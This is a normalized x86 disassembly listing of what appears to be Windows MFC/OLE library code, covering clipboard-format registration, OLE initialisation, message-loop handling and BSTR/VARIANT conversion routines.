mov esi [ esp + 0x8 ]
push edi
mov edi esi
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov al [ esi ]
cmp al 0x5c
je r-xdata
push [ esp + 0x14 ]
push edi
push [ esp + 0x18 ]
call [ lstrcpynA@IAT ]
xor eax eax
push edi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
push esi
call sub_42e14b
pop ecx
mov edi eax
cmp al 0x2f
je r-xdata
pop edi
pop esi
retn 0xc
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3a
jne r-xdata
push esi
call sub_42e14b
pop ecx
mov esi eax
jmp r-xdata
sub_45630f
push esi
push edi
mov edi [ RegisterClipboardFormatA@IAT ]
mov esi ecx
push r--data
call edi
push r--data
mov [ esi ] eax
call edi
push r--data
mov [ esi + 0x4 ] eax
call edi
push r--data
mov [ esi + 0x8 ] eax
call edi
push r--data
mov [ esi + 0xc ] eax
call edi
push r--data
mov [ esi + 0x10 ] eax
call edi
push r--data
mov [ esi + 0x14 ] eax
call edi
push r--data
mov [ esi + 0x18 ] eax
call edi
push r--data
mov [ esi + 0x1c ] eax
call edi
push r--data
mov [ esi + 0x20 ] eax
call edi
push r--data
mov [ esi + 0x24 ] eax
call edi
push r--data
mov [ esi + 0x28 ] eax
call edi
mov [ esi + 0x2c ] eax
mov eax esi
pop edi
pop esi
retn
sub_456395
mov eax sub_464ca5
call sub_42dc88
push ecx
push ebx
push esi
call sub_453349
mov esi eax
call sub_45357b
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
push ebx
call [ OleInitialize@IAT ]
cmp eax ebx
jge r-xdata
or [ esi + 0x114 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x114 ] 0x1
call sub_4428ff
mov esi eax
cmp [ esi + 0x58 ] ebx
mov [ esi + 0x54 ] sub_45648d
jne r-xdata
push ebx
call sub_456432
xor eax eax
jmp r-xdata
push 0x1
pop eax
push 0x40
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
xor eax eax
call sub_45656e
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
call sub_4428ff
mov ecx [ eax + 0x58 ]
call sub_4565cc
sub_456432
push esi
call sub_456d3a
call sub_45b3f0
call sub_42d10d
cmp [ esp + 0x8 ] 0x0
jne r-xdata
pop esi
retn 0x4
call sub_4428ff
mov esi eax
test esi esi
je r-xdata
call sub_453349
cmp [ eax + 0x114 ] 0x1
lea esi [ eax + 0x114 ]
jne r-xdata
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
call [ CoFreeUnusedLibraries@IAT ]
call [ OleUninitialize@IAT ]
and [ esi ] 0x0
and [ esi + 0x58 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_45648d
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
cmp [ rw-data ] 0x0
mov esi [ GetTickCount@IAT ]
jne r-xdata
push [ esp + 0xc ]
call sub_456432
jmp r-xdata
call esi
sub eax [ rw-data ]
cmp eax 0xea60
jbe r-xdata
call esi
inc [ rw-data ]
mov [ rw-data ] eax
pop esi
retn 0x8
call [ CoFreeUnusedLibraries@IAT ]
call esi
mov [ rw-data ] eax
sub_4564dc
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call [ SysStringLen@IAT ]
xor esi esi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov ebp eax
push esi
push esi
push ebp
push ebx
push esi
push esi
call edi
push eax
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
call sub_4425ef
push esi
push esi
push [ esp + 0x20 ]
push eax
push ebp
push ebx
push esi
push esi
call edi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_456521
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call [ SysStringLen@IAT ]
xor esi esi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov ebp eax
push esi
push esi
push ebp
push ebx
push esi
push esi
call edi
push eax
push esi
mov [ esp + 0x20 ] eax
call [ SysAllocStringByteLen@IAT ]
push esi
push esi
push [ esp + 0x20 ]
mov [ esp + 0x1c ] eax
push eax
push ebp
push ebx
push esi
push esi
call edi
pop edi
pop esi
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn 0x4
sub_45656e
push esi
mov esi ecx
call sub_44195c
push 0x1
mov [ esi + 0x3c ] r--data
pop eax
xor ecx ecx
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi ] r--data
mov [ esi + 0x20 ] ecx
mov [ esi + 0x34 ] 0x2
mov [ esi + 0x30 ] 0x2710
mov [ esi + 0x38 ] 0x1f40
mov [ esi + 0x2c ] ecx
mov [ esi + 0x1c ] ecx
mov eax esi
pop esi
retn
sub_4565cc
push esi
mov esi ecx
push 0x0
lea eax [ esi + 0x3c ]
push eax
call [ CoRegisterMessageFilter@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push 0x1
pop eax
mov [ esi + 0x1c ] eax
pop esi
retn
sub_45663d
mov eax sub_464a8d
call sub_42dc88
push ecx
push esi
push 0xc
call sub_441e89
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_442f71
and [ esi + 0x8 ] 0x0
mov [ esi ] r--data
jmp r-xdata
push ebx
lea eax [ ebp + 0x10 ]
push ebx
push eax
push 0x800
push [ ecx + 0x8 ]
push ebx
push 0x1100
call [ FormatMessageA@IAT ]
test eax eax
jne r-xdata
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
mov [ ebp + 0x8 ] esi
call sub_42dca7
pop esi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x10 ]
call [ LocalFree@IAT ]
push 0x1
pop eax
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4566e5
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi ] 0x0
jmp r-xdata
pop esi
retn 0x4
sub_45671a
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0x4 ]
jne r-xdata
push edi
push eax
call [ InterlockedDecrement@IAT ]
mov edi eax
test edi edi
jne r-xdata
xor eax eax
pop esi
retn
mov eax edi
pop edi
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
sub_456757
push ebx
mov ebx ecx
push esi
mov esi [ esp + 0xc ]
mov eax [ ebx ]
push edi
push esi
call [ eax + 0x44 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x38 ]
mov edi eax
mov eax [ esi ]
cmp [ r--data ] eax
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
cmp eax [ r--data ]
jne r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi ]
cmp [ ecx ] eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ r--data ]
jne r-xdata
xor eax eax
add edx 0x8
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ r--data ]
jne r-xdata
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ edi + 0x4 ]
xor edx edx
mov eax [ ecx + 0xc ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov edi [ edi ]
cmp edi edx
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax ebx
cmp [ eax ] edx
jne r-xdata
mov eax [ edx + 0x4 ]
add eax ebx
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
add ecx 0x8
jmp r-xdata
cmp [ ecx ] edx
je r-xdata
sub_456805
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
call [ eax + 0x38 ]
mov edi eax
lea esi [ eax + 0x4 ]
add eax 0x8
jmp r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
xor eax eax
add esi 0x8
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx ]
test eax eax
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_456865
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_456757
mov esi [ esp + 0x10 ]
test eax eax
mov [ esi ] eax
je r-xdata
push [ esp + 0xc ]
mov ecx edi
call sub_456805
mov [ esi ] eax
neg eax
sbb eax eax
and eax 0x7fffbffe
add eax 0x80004002
mov ecx edi
call sub_456701
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_4568a7
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_456865
push [ esp + 0x8 ]
mov ecx [ eax ]
push [ esp + 0x8 ]
push eax
call [ ecx ]
jmp r-xdata
retn 0x8
sub_4568cd
push ebp
mov ebp esp
mov eax 0x110
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax 0x111
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_43d8eb
jmp r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x63
jne r-xdata
pop ebp
retn 0x10
push 0x0
push 0xe146
push eax
push [ ebp + 0x8 ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
sub_45694e
push esi
push edi
push [ esp + 0x18 ]
mov esi ecx
call sub_456918
lea edi [ esi + 0x60 ]
push 0x2c
push 0x0
push edi
mov [ esi ] r--data
call sub_42dc30
mov eax [ esp + 0x20 ]
add esp 0xc
cmp [ esp + 0x10 ] 0x0
mov [ edi ] 0x2c
mov [ esi + 0x64 ] eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esi + 0x70 ] sub_4568cd
mov [ esi + 0x84 ] eax
mov eax esi
pop edi
pop esi
retn 0x10
or al 0x8
mov [ esi + 0x64 ] eax
sub_4569c9
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_449748
push esi
mov [ esi + 0x68 ] eax
call sub_43ec81
lea eax [ esi + 0x60 ]
push eax
call Ordinal_oledlg_8
mov edi eax
call sub_43eccd
mov ecx esi
call sub_43e831
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ eax + 0x1c ]
push 0x2
pop eax
cmp edi eax
je r-xdata
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
pop edi
pop esi
leave
retn
cmp edi 0x75
jne r-xdata
cmp edi 0x76
je r-xdata
mov [ esi + 0x8c ] 0x1
jmp r-xdata
mov [ esi + 0x8c ] eax
cmp edi 0x77
jne r-xdata
push 0x1
pop eax
push edi
mov ecx esi
call sub_456930
mov [ esi + 0x8c ] 0x3
jmp r-xdata
sub_456a59
push esi
mov esi ecx
call sub_44195c
mov eax [ esp + 0x8 ]
mov [ esi + 0x34 ] r--data
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x10 ]
and [ esi + 0x20 ] 0x0
and [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x24 ] eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x30 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x10
sub_456ab4
mov eax sub_464c58
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x20 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
call sub_45671a
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push [ esi + 0x24 ]
call sub_441eb2
pop ecx
sub_456b02
push esi
mov esi ecx
mov ecx [ esi + 0x28 ]
cmp ecx [ esi + 0x2c ]
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
imul eax ecx
add eax [ esi + 0x24 ]
push eax
push [ esp + 0x10 ]
call sub_42e2d0
add esp 0xc
inc [ esi + 0x28 ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop esi
retn 0x4
sub_456b4f
mov eax sub_464c6d
call sub_42dc88
push ecx
push esi
mov esi ecx
push 0x38
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ esi + 0x28 ]
pop esi
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push eax
push [ esi + 0x2c ]
push [ esi + 0x24 ]
push [ esi + 0x1c ]
call sub_456a59
sub_456bca
mov eax sub_464c78
call sub_42dc88
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0x34 ]
mov eax [ ebp + 0x14 ]
test eax eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] ebx
mov [ ebp + 0x10 ] 0x8000ffff
and [ eax ] 0x0
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x50 ]
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
mov [ ebp + 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub ebx [ ebp + 0x8 ]
mov [ eax ] ebx
add esi [ edi + 0x1c ]
dec [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_456c52
mov eax sub_464c84
call sub_42dc88
push ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push esi
lea esi [ eax - 0x34 ]
mov eax [ ebp + 0xc ]
push edi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ ebp + 0x8 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
setne al
pop ebx
leave
retn 0x8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x54 ]
test eax eax
je r-xdata
dec [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_456cc2
mov eax sub_464c90
call sub_42dc88
push ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ eax - 0x34 ]
and [ ebx ] 0x0
push edi
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] 0x8000ffff
call [ eax + 0x5c ]
mov edi eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov [ edi + 0x20 ] esi
mov [ edi + 0x20 ] eax
jmp r-xdata
mov eax [ edi + 0x20 ]
add eax 0x4
push eax
call [ InterlockedIncrement@IAT ]
add edi 0x34
and [ ebp + 0x8 ] 0x0
mov [ ebx ] edi
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
sub_456d4a
push esi
push sub_456d85
mov ecx rw-data
call sub_455223
mov esi eax
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
pop esi
retn
push r--data
call sub_456757
push eax
call [ OleIsCurrentClipboard@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
pop esi
retn
and [ esi + 0x8 ] 0x0
sub_456d85
mov eax r-xdata
call sub_42dc88
push ecx
push 0x14
call sub_454d77
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_4565f1
sub_456dc6
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi [ PeekMessageA@IAT ]
push 0x3
xor ebx ebx
push 0xf
push 0xf
lea eax [ ebp - 0x1c ]
push ebx
push eax
call esi
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
leave
retn 0x4
push 0x1
pop ebx
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x3
push 0xf
push 0xf
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call esi
test eax eax
jne r-xdata
sub_456e0e
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi r--data
add esi 0x4
cmp esi r--data
jb r-xdata
cmp [ ebp - 0x18 ] 0x100
je r-xdata
mov eax [ esi ]
push 0x2
push eax
push eax
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
shr eax 0x10
test ah 0x40
je r-xdata
cmp [ ebp - 0x18 ] 0x104
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn 0x4
sub_456e64
mov eax sub_464ccf
call sub_42dc88
sub esp 0x98
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push esi
push esi
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa4 ]
call sub_45694e
or [ ebp + 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
call sub_4569c9
cmp eax 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_4569be
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
sub_456edf
mov eax sub_464ce7
call sub_42dc88
sub esp 0x98
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push esi
push esi
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa4 ]
call sub_45694e
or [ ebp + 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
call sub_4569c9
cmp eax 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_4569be
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
sub_456f96
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ eax - 0x1c ] edi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x1
push esi
je r-xdata
mov eax [ eax - 0x8 ]
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov esi 0x36a
push edi
push esi
push esi
lea eax [ ebp - 0x1c ]
push edi
push eax
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
pop esi
jmp r-xdata
push edi
push edi
push esi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
pop edi
leave
retn 0x14
sub_456ff8
mov eax [ esp + 0x4 ]
cmp [ esp + 0x10 ] 0x1
push esi
lea esi [ eax - 0x3c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax [ esi + 0x30 ]
jbe r-xdata
pop esi
retn 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x60 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x2
jne r-xdata
sub_45703b
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edi [ eax - 0x3c ]
mov eax [ ebp + 0x10 ]
cmp eax [ edi + 0x38 ]
jbe r-xdata
xor esi esi
xor esi esi
cmp [ edi + 0x2c ] esi
jne r-xdata
push 0x2
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
push 0x2
jmp r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x5c ]
test eax eax
je r-xdata
push 0x1
mov eax [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x58 ]
pop eax
cmp [ edi + 0x2c ] esi
je r-xdata
cmp [ edi + 0x28 ] esi
je r-xdata
push ebx
push 0x3
mov ebx 0x200
push 0x209
push ebx
lea eax [ ebp - 0x1c ]
push esi
mov esi [ PeekMessageA@IAT ]
mov [ edi + 0x2c ] 0x1
push eax
push 0x108
mov ebx 0x100
push 0x209
push ebx
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
mov eax [ edi ]
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0x64 ]
and [ edi + 0x2c ] 0x0
push 0x1
pop eax
pop ebx
jmp r-xdata
push 0x3
push 0x108
jmp r-xdata
call esi
test eax eax
push 0x3
je r-xdata
pop edi
pop esi
leave
retn 0x10
push ebx
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
sub_457110
push ecx
push ebx
push ebp
push esi
mov esi ecx
xor ebp ebp
push edi
mov eax [ esi ]
push ebp
mov edi [ MultiByteToWideChar@IAT ]
push ebp
push [ eax - 0x8 ]
push eax
push ebp
push ebp
call edi
push eax
push ebp
mov [ esp + 0x18 ] eax
call [ SysAllocStringLen@IAT ]
mov ebx eax
cmp ebx ebp
jne r-xdata
push [ esp + 0x10 ]
mov eax [ esi ]
push ebx
push [ eax - 0x8 ]
push eax
push ebp
push ebp
call edi
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
call sub_43b7b5
sub_457159
movzx eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax * 4 + r--data ]
mov cl [ edx ]
add eax 0x4
test cl cl
je r-xdata
retn 0x8
push esi
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
test cl 0x40
mov esi r--data
jne r-xdata
cmp cl 0xff
je r-xdata
pop esi
movzx ecx cl
and ecx 0xffffffbf
add eax [ esi + ecx * 4 ]
mov esi r--data
sub_45719c
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x4
pop ebx
mov [ edi ] ecx
add edi ebx
cmp [ ebp + 0x14 ] 0x6
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi ] eax
add edi ebx
cmp [ ebp + 0x14 ] 0xc
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x14 ]
movzx cx [ eax ]
mov eax 0xff
mov [ ebp + 0x8 ] ecx
cmp cx ax
je r-xdata
mov edx [ ebp + 0x18 ]
and [ ebp - 0x8 ] 0x0
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x8 ]
mov [ ebp + 0x14 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
mov eax 0x8002000e
mov esi [ ebp - 0x4 ]
cmp [ ebp + 0x14 ] esi
jl r-xdata
test cl 0x40
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
mov [ ecx ] eax
mov eax 0x8002000f
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp cx ax
jne r-xdata
cmp cx ax
je r-xdata
and ecx 0xffbf
or ch 0x40
mov [ ebp + 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ edx + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x14 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0xc ]
shl eax 0x4
add esi eax
cmp cx 0xc
je r-xdata
cmp cx 0xc
jne r-xdata
inc [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
jmp r-xdata
movzx eax cx
cmp eax 0x11
jg r-xdata
mov dx [ esi ]
cmp cx dx
je r-xdata
mov [ rw-data ] 0xa
mov [ rw-data ] 0x80020004
mov esi rw-data
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
add eax 0xffffbffe
cmp eax 0x10
ja r-xdata
je r-xdata
mov edx [ ebp + 0x18 ]
mov ebx [ ebp + 0x20 ]
mov [ ebp + 0xc ] 0x8
add ebx eax
cmp cx 0xe
je r-xdata
jmp [ eax * 4 + jump_table_4573d7 ]
movzx eax [ esi + 0x8 ]
jmp r-xdata
add eax 0xfffffffe
cmp eax 0xb
ja r-xdata
cmp dx [ ebp + 0xc ]
je r-xdata
mov [ ebp + 0xc ] ecx
mov eax [ esi + 0x8 ]
mov [ edi ] eax
jmp [ eax * 4 + jump_table_4573a7 ]
cmp cx 0xe
jne r-xdata
push [ ebp + 0xc ]
push 0x0
push esi
push ebx
call [ VariantChangeType@IAT ]
test eax eax
jl r-xdata
movsx eax [ esi + 0x8 ]
jmp r-xdata
fld [ esi + 0x8 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ edi ] eax
mov eax [ esi + 0xc ]
mov [ edi + 0x4 ] eax
xor eax eax
cmp [ esi + 0x8 ] ax
setne al
jmp r-xdata
mov [ edi ] esi
jmp r-xdata
push 0x4
mov esi ebx
pop ebx
mov ax [ esi ]
cmp ax [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
mov [ ecx ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edi 0x8
jmp r-xdata
add edi ebx
push [ esi + 0x8 ]
call sub_456521
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
mov esi [ ebx + 0x8 ]
push esi
call sub_456521
push esi
mov [ ebx + 0x8 ] eax
call [ SysFreeString@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] 0x8
mov ecx [ ebp + 0x8 ]
sub_45741b
mov eax sub_464bd4
call sub_42dc88
sub esp 0x2c
and [ ebp - 0x11 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x20 ] ecx
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x10 ] esp
test eax eax
mov [ ebp + 0x8 ] eax
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
test [ ebp + 0xc ] 0xc
mov esi eax
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x1c ] eax
mov ax [ ebx + 0xc ]
mov [ ebp - 0x18 ] ax
je r-xdata
lea eax [ ebp - 0x11 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ eax + 0x8 ]
shl esi 0x4
mov eax esi
add eax 0x3
and al 0xfc
call sub_42f0a0
mov ebx esp
test ebx ebx
mov [ ebp + 0xc ] ebx
je r-xdata
lea eax [ esi + 0x3 ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov edi esp
push esi
push [ ebp + 0x8 ]
push edi
call sub_42e2d0
mov ax [ ebx + 0xc ]
add esp 0xc
cmp ax 0x8
mov [ ebp + 0x8 ] edi
jne r-xdata
mov eax 0x8007000e
jmp r-xdata
push esi
push 0x0
push ebx
call sub_42dc30
add esp 0xc
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_457159
mov esi eax
lea eax [ esi + 0x10 ]
add eax 0x3
and al 0xfc
